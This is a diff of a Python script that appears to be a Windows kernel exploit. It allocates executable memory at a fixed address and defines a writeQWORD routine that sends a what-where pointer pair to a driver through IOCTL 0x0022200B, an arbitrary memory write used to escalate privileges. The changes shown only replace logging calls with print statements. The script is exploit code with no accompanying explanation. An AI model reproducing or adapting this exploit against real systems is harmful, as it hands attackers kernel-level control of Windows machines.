@@ -1,4 +1,4 @@
-import ctypes, struct, sys, os, win32con, time
+import ctypes, struct, sys, os, win32con, time, platform
 from ctypes import *
 from ctypes.wintypes import *
 from win32com.shell import shell
@@ -18,8 +18,7 @@ baseadd = c_ulonglong(0x000000001a000000) # Easy to recognize arbitrary address
 addsize = c_ulonglong(0x3000) # Arbitrary size
 dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (win32con.MEM_COMMIT | win32con.MEM_RESERVE), win32con.PAGE_EXECUTE_READWRITE)
 if dwStatus != STATUS_SUCCESS:
-	log("Something went wrong while allocating memory","e")
-	getLastError()
+	print("Something went wrong while allocating memory","e")
 	sys.exit()
 
 def writeQWORD(driver=None, what=None, where=None):
@@ -28,16 +27,15 @@ def writeQWORD(driver=None, what=None, where=None):
 	data = struct.pack("<Q", what)
 	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
 	if dwStatus == 0:
-		log("Something went wrong while writing to memory","e")
-		getLastError()
+		print("Something went wrong while writing to memory","e")
+
 		sys.exit()
   
   # Pack the address of the what value and the where address
 	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
 	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
 	if dwStatus == 0:
-		log("Something went wrong while writing to memory","e")
-		getLastError()
+		print("Something went wrong while writing to memory","e")
 		sys.exit()
 
 	IoControlCode = 0x0022200B
